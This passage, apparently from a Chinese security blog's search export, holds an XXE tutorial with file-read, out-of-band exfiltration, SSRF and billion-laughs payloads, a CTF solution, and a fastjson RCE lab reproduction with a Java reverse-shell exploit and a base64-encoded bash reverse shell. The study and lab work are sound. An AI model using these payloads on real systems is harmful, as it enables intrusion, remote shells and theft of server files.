&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>外部evil.dtd中的内容。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/evildtd.png" alt="evil.dtd"></p><p>当然也可以进行内网站点的入侵。</p><p><img src="/images/2-1024x330.png" alt="入侵"></p><p>以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。</p><p><strong>无回显的情况</strong></p><p>blind xxe漏洞方案1：</p><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p><p>创建test.php写入以下内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php file_put_contents("test.txt", $_GET['file']) ; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建index.php写入以下内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php $xml=&lt;&lt;&lt;EOF &lt;?xml version="1.0"?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % file SYSTEM "file:///C:/test.txt"&gt; &lt;!ENTITY % remote SYSTEM "http://localhost/test.xml"&gt; %remote;%all;%send; ]&gt; EOF; $data = simplexml_load_string($xml) ; echo "&lt;pre&gt;" ; print_r($data) ; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建test.xml并写入以下内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当访问<a href="http://localhost/index.php">http://localhost/index.php</a>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p><p>blind xxe漏洞方案2：<br>可以将文件内容发送到远程服务器，然后读取。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml verstion="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a[        &lt;!ENTITY % f SYSTEM "http://yourhost/evil.dtd"&gt;        %f;]&gt;&lt;a&gt;&amp;b;&lt;/a&gt;$data = simplexml_load_string($xml);print_r($data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程服务器的evil.dtd文件内容</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>blind xxe漏洞方案3：<br>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version=”1.0”?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"&gt; # /etc/issue&lt;!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"&gt;%dtd;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % all“&lt;!ENTITY &amp;#x25; send SYSTEM ‘http://xxx.xxx.xxx/?%file;’&gt;”&gt;%all;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有报错直接查看报错信息。</p><p>无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p><p><img src="/images/rizhi.png" alt="rizhi"></p><p><img src="/images/cattxt.png" alt="读取txt"></p><p><strong>这里列举几个案例：</strong></p><p>恶意引入外部实体1：</p><p><strong>XML内容</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [      &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>恶意引入外部实体2：</p><p><strong>XML内容</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [     &lt;!ENTITY % d SYSTEM "http://yourhost/evil.dtd"&gt;     %d;]&gt;&lt;aaa&gt;&amp;b;&lt;/aaa&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DTD文件（evil.dtd）内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>恶意引入外部实体3</p><p><strong>XML内容</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml verstion="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a SYSTEM "http://yourhost/evil.dtd"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>DTD文件内容</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>恶意引入外部实体(4)</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>危害2：命令执行</strong><br>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = "1.0"?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM "except://ls"&gt; # id]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><p><strong>危害3：内网探测/SSRF</strong><br>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version = "1.0"?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY f SYSTEM "http://192.168.1.1:80/"&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;EOF;$data = simplexml_load_string($xml);print_r($data);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该CASE是攻击内网struts2网站，远程执行系统命令。</p><p>危害5：拒绝服务攻击</p><ol><li><p>To crash the server / Cause denial of service:</p><p>]&gt;<br>&amp;lol9;</p></li></ol><p>上面样例代码2中的XXE漏洞攻击就是著名的’billion laughs’ 攻击。</p><p>(<a href="https://en.wikipedia.org/wiki/Billion_laughs)%EF%BC%8C%E8%AF%A5%E6%94%BB%E5%87%BB%E9%80%9A%E8%BF%87%E5%88%9B%E5%BB%BA%E4%B8%80%E9%A1%B9%E9%80%92%E5%BD%92%E7%9A%84">https://en.wikipedia.org/wiki/Billion_laughs)，该攻击通过创建一项递归的</a> XML 定义，在内存中生成十亿个”Ha!”字符串，从而导致 DDoS 攻击。</p><p>原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。除了这些，攻击者还可以读取服务器上的敏感数据，还能通过端口扫描，获取后端系统的开放端口。</p><h3 id="0x05-XXE漏洞修复与防御"><a href="#0x05-XXE漏洞修复与防御" class="headerlink" title="0x05 XXE漏洞修复与防御"></a>0x05 XXE漏洞修复与防御</h3><p>xxe漏洞存在是因为XML解析器解析了用户发送的不可信数据。<br>然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。<br>大部分的XML解析器默认对于XXE攻击是脆弱的。<br>因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。<br>通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。<br>因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p><p>方案一：使用开发语言提供的禁用外部实体的方法<br>PHP</p><pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);JAVADocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方案二：过滤用户提交的XML数据</p><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p><h3 id="0x06-一道CTF题目"><a href="#0x06-一道CTF题目" class="headerlink" title="0x06 一道CTF题目"></a>0x06 一道CTF题目</h3><p><img src="/images/api.png" alt="api"></p><p>题目链接：<br><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>目的很明确获取/home/ctf/flag.txt的内容</p><p>下面分析源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;function XHR() {        var xhr;        try {xhr = new XMLHttpRequest();}        catch(e) {            var IEXHRVers =["Msxml3.XMLHTTP","Msxml2.XMLHTTP","Microsoft.XMLHTTP"];            for (var i=0,len=IEXHRVers.length;i&lt; len;i++) {                try {xhr = new ActiveXObject(IEXHRVers[i]);}                catch(e) {continue;}            }        }        return xhr;    }function send(){ evil_input = document.getElementById("evil-input").value; var xhr = XHR();     xhr.open("post","/api/v1.0/try",true);     xhr.onreadystatechange = function () {         if (xhr.readyState==4 &amp;&amp; xhr.status==201) {             data = JSON.parse(xhr.responseText);             tip_area = document.getElementById("tip-area");             tip_area.value = data.task.search+data.task.value;         }     };     xhr.setRequestHeader("Content-Type","application/json");     xhr.send('{"search":"'+evil_input+'","value":"own"}');}&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显是AJAX异步传送数据</p><p>在一般的异步网站都会有异步数据与服务器的交互，一般传送数据为json但如果将传送的数据格式改为xml。有很大的可能服务器会解析你异步上传的xml脚本执行想要干的事</p><p><img src="/images/ajax.png" alt="ajax"></p><p>解题步骤：<br>要先修改Content-Type: application/xml</p><p>然后加入xml脚本即可</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY myentity SYSTEM "file:///home/ctf/flag.txt" &gt;]&gt;&lt;abc&gt;&amp;myentity;&lt;/abc&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/xml.png" alt="xml"></p><p>得到返回结果</p><p>CTF{XxE_15_n0T_S7range_Enough}</p><p><img src="/images/XXE-482x1024.png" alt="xxe"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe漏洞学习 </tag>
            
            <tag> 漏洞原理解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/02/02/hello-world/"/>
      <url>/2023/02/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson漏洞复现</title>
      <link href="/2023/02/01/fastjson1-2-24rce-fu-xian/"/>
      <url>/2023/02/01/fastjson1-2-24rce-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE"><a href="#CVE-2017-18349-FastJson-1-2-24-反序列化漏洞RCE" class="headerlink" title="CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE"></a>CVE-2017-18349 FastJson 1.2.24 反序列化漏洞RCE</h1><h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><pre class="line-numbers language-none"><code class="language-none">fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞影响版本为fastjson &lt; 1.2.25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20<br>更换java版本：</p><pre class="line-numbers language-none"><code class="language-none">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用docker容器启动fastjson靶场</p><p><img src="/images/1.png"></p><p>用burp抓包放到Repeater模块进行测试</p><p><img src="/images/2.png"></p><p>先用ldap协议向第三方dnslog发送数据看看会不会有回显</p><p><img src="/images/3.png"></p><p>可以看到第三方dnslog收到回显</p><p>下面就让我们来通过github上的<a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a> 来构建一个RMI服务，然后再在本地开启一个web服务构造一个poc从而实现对fastjson实现RCE，话不多说，开干。</p><p>先下载marshalsec</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/mbechler/marshalsec.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后下载maven并编译marshalsec生成jar</p><pre class="line-numbers language-none"><code class="language-none">- apt-get install maven- mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/4.png"></p><p>mvn编译成功</p><p>下面构建exp攻击脚本Exploit.java</p><pre class="line-numbers language-none"><code class="language-none">public class Exploit {public Exploit(){ try{            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.52.136/6666 0&gt;&amp;1");        }catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv){        Exploit e = new Exploit();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行javac  Exploit.java编译得到Exploit.class文件</p><p>在exp攻击脚本目录下开启一个web服务</p><p><img src="/images/5.png"></p><p>开启一个RMI服务,监听8888端口</p><pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.52.136:8000/#Exploit" 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/6.png"></p><p>用nc开启监听6666端口</p><p><img src="/images/7.png"></p><p>burp构建发包请求</p><p><img src="/images/8.png"></p><p>RMI服务器收到请求</p><p><img src="/images/9.png"></p><p>通过exp脚本反弹给nc一个shell</p><p><img src="/images/10.png"></p><h1 id="CNVD-2019-22238-fastjson反序列化漏洞"><a href="#CNVD-2019-22238-fastjson反序列化漏洞" class="headerlink" title="CNVD-2019-22238 fastjson反序列化漏洞"></a>CNVD-2019-22238 fastjson反序列化漏洞</h1><p><strong>漏洞原理</strong></p><pre class="line-numbers language-none"><code class="language-none">Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。影响版本为 fastjson &lt; 1.2.47<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>漏洞复现</strong></p><p>这里用的是vulhub的1.2.47-rce</p><p><img src="/images/1247.jpg"></p><p>先用burp抓包然后运用第三方dnslog测试一下</p><p><img src="/images/1247fx.jpg"></p><p>如上图所示，dns有数据，证明有漏洞</p><p>下面利用此工具git clone <a href="https://github.com/welk1n/JNDI-Injection-Exploit.git">https://github.com/welk1n/JNDI-Injection-Exploit.git</a> 进行进一步的漏洞利用</p><pre class="line-numbers language-none"><code class="language-none">反弹的的ip和端口是192.168.52.128和10000bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEyOC8xMDAwMCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/jndi.jpg"></p><p>用nc监听10000端口</p><p><img src="/images/nc.jpg"></p><p>用burp构建exp发包</p><p><img src="/images/1247end.jpg"></p><p>可以看到nc收到反弹shell，漏洞验证成功</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
